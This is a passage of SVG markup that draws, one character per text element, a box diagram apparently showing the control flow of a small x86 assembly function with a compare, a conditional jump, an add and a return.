<text text-anchor='middle' x='160' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='292' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='160' y='324' fill='currentColor' style='font-size:1em'>L</text>
<text text-anchor='middle' x='160' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='420' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='500' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='660' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='160' y='692' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='160' y='724' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='160' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='292' fill='currentColor' style='font-size:1em'>w</text>
<text text-anchor='middle' x='168' y='324' fill='currentColor' style='font-size:1em'>3</text>
<text text-anchor='middle' x='168' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='420' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='500' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='660' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='168' y='692' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='168' y='724' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='168' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='36' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='176' y='68' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='176' y='100' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='176' y='132' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='176' y='164' fill='currentColor' style='font-size:1em'>j</text>
<text text-anchor='middle' x='176' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='292' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='176' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='356' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='176' y='372' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='176' y='388' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='176' y='404' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='176' y='420' fill='currentColor' style='font-size:1em'>┘</text>
<text text-anchor='middle' x='176' y='468' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='176' y='484' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='176' y='500' fill='currentColor' style='font-size:1em'>┘</text>
<text text-anchor='middle' x='176' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='36' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='184' y='68' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='184' y='100' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='184' y='132' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='184' y='164' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='184' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='292' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='184' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='580' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='184' y='596' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='184' y='612' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='184' y='628' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='184' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='692' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='184' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='36' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='192' y='68' fill='currentColor' style='font-size:1em'>v</text>
<text text-anchor='middle' x='192' y='100' fill='currentColor' style='font-size:1em'>v</text>
<text text-anchor='middle' x='192' y='132' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='192' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='292' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='192' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='356' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='192' y='372' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='192' y='388' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='192' y='404' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='192' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='692' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='192' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='36' fill='currentColor' style='font-size:1em'>h</text>
<text text-anchor='middle' x='200' y='164' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='200' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='596' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='200' y='612' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='200' y='628' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='200' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='692' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='200' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='68' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='208' y='100' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='208' y='132' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='208' y='164' fill='currentColor' style='font-size:1em'>L</text>
<text text-anchor='middle' x='208' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='292' fill='currentColor' style='font-size:1em'>[</text>
<text text-anchor='middle' x='208' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='596' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='36' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='216' y='68' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='216' y='100' fill='currentColor' style='font-size:1em'>w</text>
<text text-anchor='middle' x='216' y='132' fill='currentColor' style='font-size:1em'>w</text>
<text text-anchor='middle' x='216' y='164' fill='currentColor' style='font-size:1em'>2</text>
<text text-anchor='middle' x='216' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='292' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='216' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='468' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='216' y='484' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='216' y='500' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='216' y='516' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='216' y='532' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='216' y='596' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='612' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='216' y='628' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='216' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='36' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='224' y='68' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='224' y='100' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='224' y='132' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='224' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='196' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='224' y='212' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='228' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='244' fill='currentColor' style='font-size:1em'>┘</text>
<text text-anchor='middle' x='224' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='292' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='224' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='596' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='612' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='36' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='232' y='68' fill='currentColor' style='font-size:1em'>,</text>
<text text-anchor='middle' x='232' y='100' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='232' y='132' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='232' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='292' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='232' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='484' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='232' y='516' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='232' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='596' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='612' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='100' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='240' y='132' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='240' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='196' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='240' y='212' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='240' y='228' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='240' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='292' fill='currentColor' style='font-size:1em'>-</text>
<text text-anchor='middle' x='240' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='484' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='240' y='516' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='240' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='596' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='612' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='68' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='248' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='292' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='248' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='404' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='248' y='420' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='248' y='436' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='248' y='452' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='248' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='484' fill='currentColor' style='font-size:1em'>v</text>
<text text-anchor='middle' x='248' y='516' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='248' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='564' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='248' y='580' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='248' y='596' fill='currentColor' style='font-size:1em'>┘</text>
<text text-anchor='middle' x='248' y='612' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='68' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='256' y='100' fill='currentColor' style='font-size:1em'>[</text>
<text text-anchor='middle' x='256' y='132' fill='currentColor' style='font-size:1em'>[</text>
<text text-anchor='middle' x='256' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='292' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='256' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='612' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='68' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='264' y='100' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='264' y='132' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='264' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='292' fill='currentColor' style='font-size:1em'>4</text>
<text text-anchor='middle' x='264' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='484' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='264' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='612' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='100' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='272' y='132' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='272' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='292' fill='currentColor' style='font-size:1em'>]</text>
<text text-anchor='middle' x='272' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='484' fill='currentColor' style='font-size:1em'>w</text>
<text text-anchor='middle' x='272' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='612' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='100' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='280' y='132' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='280' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='292' fill='currentColor' style='font-size:1em'>,</text>
<text text-anchor='middle' x='280' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='484' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='280' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='612' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='100' fill='currentColor' style='font-size:1em'>-</text>
<text text-anchor='middle' x='288' y='132' fill='currentColor' style='font-size:1em'>-</text>
<text text-anchor='middle' x='288' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='484' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='288' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='612' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='296' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='296' y='100' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='296' y='132' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='296' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='296' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='296' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='296' y='292' fill='currentColor' style='font-size:1em'>2</text>
<text text-anchor='middle' x='296' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='296' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='296' y='484' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='296' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='296' y='612' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='296' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='296' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='100' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='304' y='132' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='304' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='612' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='100' fill='currentColor' style='font-size:1em'>4</text>
<text text-anchor='middle' x='312' y='132' fill='currentColor' style='font-size:1em'>4</text>
<text text-anchor='middle' x='312' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='484' fill='currentColor' style='font-size:1em'>[</text>
<text text-anchor='middle' x='312' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='612' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='320' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='320' y='100' fill='currentColor' style='font-size:1em'>]</text>
<text text-anchor='middle' x='320' y='132' fill='currentColor' style='font-size:1em'>]</text>
<text text-anchor='middle' x='320' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='320' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='320' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='320' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='320' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='320' y='484' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='320' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='320' y='612' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='320' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='320' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='328' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='328' y='100' fill='currentColor' style='font-size:1em'>,</text>
<text text-anchor='middle' x='328' y='132' fill='currentColor' style='font-size:1em'>,</text>
<text text-anchor='middle' x='328' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='328' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='328' y='276' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='328' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='328' y='308' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='328' y='324' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='328' y='340' fill='currentColor' style='font-size:1em'>┘</text>
<text text-anchor='middle' x='328' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='328' y='484' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='328' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='328' y='612' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='328' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='328' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='336' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='336' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='336' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='336' y='468' fill='currentColor' style='font-size:1em'>─</text>
